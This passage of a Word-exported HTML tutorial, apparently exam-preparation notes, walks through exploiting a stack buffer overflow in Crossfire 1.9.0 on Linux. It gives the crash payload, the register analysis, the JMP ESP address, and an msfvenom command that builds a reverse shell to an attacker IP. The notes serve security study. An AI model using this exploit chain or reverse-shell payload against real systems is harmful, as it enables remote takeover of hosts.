style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>After running it we got the shell �..<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU;mso-no-proof:yes'><!--[if gte vml 1]><v:shape id="Picture_x0020_28"
 o:spid="_x0000_i1025" type="#_x0000_t75" style='width:357.9pt;height:399.9pt;
 visibility:visible;mso-wrap-style:square'>
 <v:imagedata src="BoF_files/image007.png" o:title=""/>
</v:shape><![endif]--><![if !vml]><img border=0 width=477 height=533
src="BoF_files/image008.jpg" v:shapes="Picture_x0020_28"><![endif]></span><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'><o:p>&nbsp;</o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal;mso-outline-level:1'><b><span style='font-size:16.0pt;
font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
color:#1E4E79;mso-font-kerning:18.0pt;mso-ansi-language:EN-AU'>BUFFER OVERFLOW
IN LINUX<o:p></o:p></span></b></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>We will use Crossfire 1.9.0 as it is
vulnerable. It has a network-based <span class=SpellE>BoF</span> when strings
of more than 4000 bytes in the setup sound <span class=GramE>command</span><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>We will use the <b><span
style='color:black;mso-color-alt:windowtext;background:#CCFFCC'>Evans Debugger
(EDB)</span></b> (Not in Raspberry PI as this is for <span class=SpellE>x86</span>)<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>Memory protection techniques in
Linux: Data Execution Prevention (DEP), Address Space Layout Randomization
(ASLR), and Stack Canaries. To avoid them, we need to use a Crossfire compiled
without stack-smashing protection (stack canaries), ASLR, and DEP.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>To crash the app we can use a
payload like:<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>crash = &quot;\<span class=SpellE>x41</span>&quot; *
4379<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>buffer = <span style='color:black;mso-color-alt:windowtext;
background:#CCFFCC'>&quot;\<span class=SpellE>x11</span>(</span>setup sound
&quot; + crash + &quot;<span style='color:black;mso-color-alt:windowtext;
background:#CCFFCC'>\<span class=SpellE>x90</span>\<span class=SpellE>x00</span>#</span>&quot;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>To identify that payload, we should
follow the same process to create the spike scripts and start playing with them
to identify where the app is vulnerable.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><b><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Testing the
crash:</span></b><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>The process is almost the same than in Windows but
using <span class=SpellE>edb</span> debugger instead of immunity in this case.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>In the python script the test 6 is used to validate
the application crashes when receiving this information.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>After crashing the application, we should observe the
register values to identify how can we continue the exploit.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>In this case we can observe: <o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:1.25in;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l6 level1 lfo25;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>ESP points
to the last part of the string we sent (position 4363 to 4369). This left only
7 bytes to use. The shell code cannot be injected <span class=GramE>there</span><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:1.25in;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l6 level1 lfo25;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>However, we
can observe the EAX contains the memory position where the buffer we have sent
starts: (&quot;<span style='background:aqua;mso-highlight:aqua'>setup sound</span>
AAAAAAA�.&quot;).<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Analysing this data, we can see there are <span
style='background:aqua;mso-highlight:aqua'>12 bytes</span> (including the
space) before the part we have control of (buffer<span class=GramE>)</span> and
we have control over the EAX. <o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>What we need to do in this case is:<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:1.25in;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l7 level1 lfo26;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Use the 7
bytes we have control of that are pointed by ESP (position 4363 to 4369) to
inject something that let us go to EAX + <span class=GramE>12</span> <o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:1.25in;text-align:left;text-indent:-.25in;
line-height:normal;mso-list:l7 level1 lfo26;tab-stops:list .5in;vertical-align:
middle'><![if !supportLists]><span style='font-size:10.0pt;mso-bidi-font-size:
11.0pt;font-family:Symbol;mso-fareast-font-family:Symbol;mso-bidi-font-family:
Symbol;mso-ansi-language:EN-AU'><span style='mso-list:Ignore'>�<span
style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span></span><![endif]><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>This can be
done by injecting ADD EAX,12 and JMP EAX in the last 7 bytes.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>To get the opcodes for <span class=GramE>this
operations</span> we can use <span class=SpellE>msf-nasm_shell</span>:<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
class=SpellE><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";color:black;mso-color-alt:windowtext;background:#CCFFCC;
mso-ansi-language:EN-AU'>msf-nasm_shell</span></span><span style='font-family:
"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";mso-ansi-language:
EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&gt;add <span class=SpellE>eax,12</span><span
style='mso-spacerun:yes'>���� </span>=&gt;<span style='mso-spacerun:yes'>�
</span><span style='color:black;mso-color-alt:windowtext;background:#CCFFCC'>83C00C</span><span
style='mso-spacerun:yes'>�� </span>add <span class=SpellE>eax,byte</span> +<span
class=SpellE>0xc</span><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&gt; <span class=SpellE>jmp</span> <span class=SpellE>eax</span><span
style='mso-spacerun:yes'>��������� </span>=&gt; <span style='color:black;
mso-color-alt:windowtext;background:#CCFFCC'>FFE0</span><span
style='mso-spacerun:yes'>������� </span><span class=SpellE>jmp</span> <span
class=SpellE>eax</span><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>This is &quot;\<span class=SpellE>x83</span>\<span
class=SpellE>xc0</span>\<span class=SpellE>x0c</span>\<span class=SpellE>xff</span>\<span
class=SpellE>xe0</span>&quot;. It uses only 5 bytes from the 7 available so we
can add 2 <span class=SpellE>nops</span> at the end.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>We need to inject <span class=GramE>this opcodes</span>
in the part where the ESP is pointing to.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><b><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Testing the
ESP value</span></b><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>In the python script 7 I created a PoC to validate we
can control ESP and AIX as analysed.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>After running we can observe EAX (already in control
in test 6) and ESP are controlled by <span class=GramE>us</span> and we
injected the desired values.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><b><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Checking <span
class=SpellE>badchars</span></span></b><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Before completing the shellcode, it is important to
check <span class=SpellE>badchars</span> in the same way than in windows. By
sending all the possible chars and observing the stack to validate the
information is received in a good way. If someone is missing, remove it and
test it again until we have all the possible values sent in the stack without
problem.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>The test 8 includes this part. Including the buffer
fulfilling with A's. <span class=GramE>That's</span> important as we should
maintain the same buffer size to keep the registers with the values we want.<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><b><span style='font-family:"Calibri",sans-serif;
mso-fareast-font-family:"Times New Roman";mso-ansi-language:EN-AU'>Finding the
return address and Injecting the Shellcode</span></b><span style='font-family:
"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";mso-ansi-language:
EN-AU'><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><span style='mso-spacerun:yes'>�</span>So the last
part is to control the EIP. We need it to point to an address with the
instruction JMP ESP <o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>EDB debugger comes with <span class=GramE>the a</span>
plugging called <span class=SpellE>Opcodesearcher</span> (<span class=SpellE>Pluggins</span>
-&gt; <span class=SpellE>OpcodeSearch</span> or <span class=SpellE>ctrl+o</span>)<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Looking for jump equivalent ESP -&gt; EIP and
selecting any of the process we can find one at address 08134596 (\<span
class=SpellE>x96</span>\<span class=SpellE>x45</span>\<span class=SpellE>x13</span>\<span
class=SpellE>x08</span> in little <span class=SpellE>indian</span>)<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
class=SpellE><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'>eip</span></span><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'> = b<b>&quot;</b>\<span class=SpellE>x96</span>\<span
class=SpellE>x45</span>\<span class=SpellE>x13</span>\<span class=SpellE>x08</span><b>&quot;</b><o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>Now we need to create the reverse shell for <span
class=SpellE>linux</span> (-f to define language python in this case, -v name
of the variable to assign the shellcode, -b list of <span class=SpellE>badchars</span>)<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:.75in;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'><span style='mso-spacerun:yes'>�</span><span
class=SpellE>msfvenom</span> -p <span class=SpellE>linux</span>/<span
class=SpellE>x86</span>/<span class=SpellE>shell_reverse_tcp</span>
LHOST=[KALI_IP] LPORT=443 -b &quot;\<span class=SpellE>x00</span>\<span
class=SpellE>x20</span>&quot; -f <span class=SpellE>py</span> -v shellcode<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-top:0in;margin-right:0in;
margin-bottom:0in;margin-left:27.0pt;text-align:left;line-height:normal'><span
style='font-family:"Calibri",sans-serif;mso-fareast-font-family:"Times New Roman";
mso-ansi-language:EN-AU'>In the python script 9 is used to complete this test<o:p></o:p></span></p>

<p class=MsoNormal align=left style='margin-bottom:0in;text-align:left;
line-height:normal'><span style='font-family:"Calibri",sans-serif;mso-fareast-font-family:
"Times New Roman";mso-ansi-language:EN-AU'><o:p>&nbsp;</o:p></span></p>

</div>

</body>

</html>
